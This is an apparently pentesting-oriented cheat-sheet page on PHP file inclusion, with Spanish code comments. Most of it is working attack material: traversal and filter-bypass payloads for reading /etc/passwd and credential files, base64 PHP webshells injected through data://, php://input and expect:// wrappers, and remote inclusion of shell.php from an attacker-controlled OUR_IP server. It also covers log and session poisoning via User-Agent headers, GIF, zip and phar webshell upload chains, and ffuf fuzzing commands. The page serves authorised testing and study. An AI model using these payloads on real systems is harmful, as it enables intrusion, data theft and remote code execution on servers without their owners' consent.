---
title: "File Inclusion"
description: "LFI, RFI, log poisoning, and PHP wrappers."
sidebar:
  order: 8
  label: "File Inclusion"
---
> LFI/RFI: local or remote file inclusion through unsanitized parameters. Scales from file reading to RCE using PHP wrappers, log poisoning, and upload+include.

---


## Detection and Key Files

```bash
# Detección básica — rutas absolutas
?language=/etc/passwd
?language=C:\Windows\boot.ini

# Detección con path traversal
?language=../../../../etc/passwd
?language=../../../../Windows/win.ini

# Archivos de lectura frecuente en LFI
/etc/passwd                           # usuarios del sistema
/etc/hosts                            # hosts internos
/etc/hostname
/proc/self/environ                    # variables de entorno (User-Agent incluido)
/proc/self/cmdline                    # proceso actual
/proc/net/fib_trie                    # IPs internas
/var/www/html/config.php              # credenciales de BD
/etc/apache2/apache2.conf             # config Apache
/etc/nginx/nginx.conf                 # config Nginx
/etc/php/7.4/apache2/php.ini          # configuración PHP (probar versiones 7.x, 8.x)
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
```

---

## Path Traversal

```bash
# Ruta absoluta directa
?language=/etc/passwd

# Path traversal relativo (preferido — funciona incluso con prefijos de directorio)
?language=../../../../etc/passwd

# Muchos ../ no rompen nada — llegan al root y se quedan ahí
?language=../../../../../../../../../../../etc/passwd

# Prefijo de directorio en código (include("./lang/" . $param))
# Usar / al inicio para que el prefijo sea tratado como directorio
?language=/../../../etc/passwd
```

---

## Filter Bypasses

### Non-Recursive Filter (`str_replace('../', '', input)`)

```bash
# ....// → tras eliminar ../ queda ../
?language=....//....//....//etc/passwd

# Variantes
?language=..././..././..././etc/passwd
?language=....\/....\/....\/etc/passwd
```

### URL Encoding

```bash
# . = %2e / = %2f
?language=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Double encoding (para WAFs que descodifican una vez)
?language=%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Approved Path Bypass (regex `^./languages/`)

```bash
# Empezar con el path aprobado, luego traversal
?language=./languages/../../../../etc/passwd
```

### Extension Added by Code (`include($param . ".php")`)

```bash
# Null byte — PHP < 5.5 (obsoleto en PHP moderno)
?language=../../../../etc/passwd%00

# Path truncation — PHP < 5.3 (string max 4096 chars)
# El .php añadido se trunca al superar 4096 chars
?language=non_existing/../../../etc/passwd/./././././././[...repetir ~2048 veces]
# Generar automáticamente:
echo -n "non_existing/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

---

## PHP Wrappers

### Reading PHP Source Code (base64 filter)

```bash
# Leer source code de un archivo PHP
?language=php://filter/read=convert.base64-encode/resource=config
# Si la extensión .php se añade automáticamente, resource=config → config.php

# Decodificar en local
echo 'PD9waHAK...' | base64 -d

# Verificar allow_url_include en php.ini
curl "http://target/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini" | grep -a 'allow_url_include'
# Decodificar el output y grep:
echo '...' | base64 -d | grep allow_url_include
```

### RCE — data Wrapper (requires `allow_url_include = On`)

```bash
# Codificar webshell en base64
echo '<?php system($_GET["cmd"]); ?>' | base64
# PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==

# Inyectar vía data wrapper
?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

# Con curl
curl -s 'http://target/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'
```

### RCE — php://input Wrapper (POST, requires `allow_url_include = On`)

```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' \
  "http://target/index.php?language=php://input&cmd=id"
```

### RCE — expect Wrapper (requires `expect` extension installed)

```bash
# Verificar si expect está disponible
echo '...' | base64 -d | grep expect

# Ejecutar comando directamente
?language=expect://id
curl -s "http://target/index.php?language=expect://id"
```

---

## RFI — Remote File Inclusion

```bash
# Verificar RFI (probar URL local primero — evita firewall)
?language=http://127.0.0.1:80/index.php

# RFI vía HTTP
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sudo python3 -m http.server 80
?language=http://OUR_IP/shell.php&cmd=id

# RFI vía FTP (útil si HTTP está bloqueado)
sudo python -m pyftpdlib -p 21
?language=ftp://OUR_IP/shell.php&cmd=id
# Con credenciales:
?language=ftp://user:pass@OUR_IP/shell.php&cmd=id

# RFI vía SMB (Windows — no necesita allow_url_include)
impaket-smbserver -smb2support share $(pwd)
?language=\\OUR_IP\share\shell.php&cmd=whoami
```

---

## Log Poisoning → RCE

### Apache/Nginx access.log via User-Agent

```bash
# Paso 1: verificar acceso al log
?language=/var/log/apache2/access.log
?language=/var/log/nginx/access.log
?language=../../../../var/log/apache2/access.log

# Paso 2: inyectar PHP en User-Agent (via Burp o curl)
curl -s "http://target/index.php" -H 'User-Agent: <?php system($_GET["cmd"]); ?>'

# Alternativa con archivo:
echo -n 'User-Agent: <?php system($_GET["cmd"]); ?>' > poison
curl -s "http://target/index.php" -H @poison

# Paso 3: incluir el log + ejecutar comando
?language=/var/log/apache2/access.log&cmd=id
```

### Log Paths

```bash
# Apache
/var/log/apache2/access.log     # Linux
C:\xampp\apache\logs\access.log # Windows

# Nginx
/var/log/nginx/access.log       # Linux
C:\nginx\log\access.log         # Windows

# Otros logs envenenables
/var/log/sshd.log               # SSH: usar usuario malicioso en login
/var/log/vsftpd.log             # FTP: usuario malicioso
/var/log/mail                   # Mail: enviar email con PHP code

# /proc (si no hay acceso a logs)
/proc/self/environ              # User-Agent en env
/proc/self/fd/N                 # FDs del proceso (N: 0-50)
```

### Session Poisoning (PHP)

```bash
# Paso 1: encontrar el archivo de sesión
# PHPSESSID cookie → /var/lib/php/sessions/sess_<PHPSESSID>
# Ejemplo: PHPSESSID=abc123 → /var/lib/php/sessions/sess_abc123

# Paso 2: leer el archivo de sesión vía LFI
?language=/var/lib/php/sessions/sess_abc123

# Paso 3: inyectar PHP en un parámetro que se almacene en sesión
?language=<?php system($_GET['cmd']); ?>
# URL encoded: %3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E

# Paso 4: incluir la sesión + ejecutar
?language=/var/lib/php/sessions/sess_abc123&cmd=id

# Rutas de sesiones
/var/lib/php/sessions/          # Linux
C:\Windows\Temp\                # Windows
```

---

## LFI + File Upload → RCE

### GIF Webshell (Preferred Method)

```bash
# Crear imagen maliciosa con PHP
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
# GIF8 = magic bytes para pasar validación de tipo de archivo

# Subir via formulario de profile/avatar
# Obtener ruta del archivo subido desde el src del img en el HTML:
# <img src="/profile_images/shell.gif">

# Incluir vía LFI + ejecutar
?language=./profile_images/shell.gif&cmd=id
```

### Zip Wrapper

```bash
# Crear webshell + comprimir como imagen
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php

# Incluir con zip wrapper
?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
# %23 = # (separador del archivo dentro del zip)
```

### Phar Wrapper

```php
// shell.php — generar archivo phar
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
?>
```

```bash
# Compilar y renombrar
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg

# Incluir con phar wrapper
?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
# %2F = / (separador sub-archivo)
```

---

## Automated Fuzzing

```bash
# Fuzzing de parámetros LFI
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u 'http://target/index.php?FUZZ=value' -fs 2287

# Fuzzing de payloads LFI
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
  -u 'http://target/index.php?language=FUZZ' -fs 2287

# Fuzzing de archivos PHP disponibles
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
  -u http://target/FUZZ.php
```

---

## PHP Functions Table

| Function | Reads | Executes | Remote URL |
|---------|-----|---------|-----------|
| `include()/include_once()` | ✅ | ✅ | ✅ |
| `require()/require_once()` | ✅ | ✅ | ❌ |
| `file_get_contents()` | ✅ | ❌ | ✅ |
| `fopen()/file()` | ✅ | ❌ | ❌ |

> Only functions with **Executes=✅** are exploitable for RCE via inclusion.

---

## Pitfalls / Gotchas

- **Absolute path does not work:** the code appends a directory prefix. Use `../../../../` instead of `/etc/passwd` directly.
- **`.php` extension automatically appended:** use wrappers (`php://filter`) which are unaffected, or null byte (PHP < 5.5).
- **`allow_url_include = Off`:** `data://` and `php://input` will not work. Verify the `php.ini` configuration first using the filter wrapper.
- **Log poisoning — unreadable log:** Apache logs require root/adm. Try Nginx first (readable by www-data).
- **Very large log:** including huge log files can crash the server in production. Be cautious.
- **Session poisoning — overwriting:** the session is overwritten with each request. Chain the include + cmd in the same request.
- **GIF webshell with extension validation:** if the app rejects `.gif`, try `.jpg` or `.png`. The magic bytes are key if it validates content.
- **Zip wrapper disabled:** it is not enabled by default. If it fails, use the direct GIF method.
- **SMB RFI on Linux:** SMB via UNC paths only works on Windows. On Linux, use HTTP or FTP.
- **Fuzzing with LFI-Jhaddix:** large wordlist (~4k entries). Calibrate using `-fs` to avoid false positives.
- **`#` in zip wrapper:** the `#` must be URL-encoded as `%23` in the URL, or the browser will interpret it as a fragment.

---

## Related Cheatsheets

- [File Upload Attacks](/en/metodologias/web/file-upload-attacks/) — upload webshells to combine with LFI
- [Attacking Web Applications with Ffuf](/en/metodologias/recon/attacking-web-applications-ffuf/) — fuzzing parameters and LFI payloads
- [Using Web Proxies](/en/metodologias/web/using-web-proxies/) — intercept and modify User-Agent for log poisoning
- [Shells & Payloads](/en/metodologias/exploitation/shells-payloads/) — reverse shells to scale from LFI webshell
- [Web Attacks](/en/metodologias/web/web-attacks/) — XXE also supports PHP wrappers and SSRF via RFI
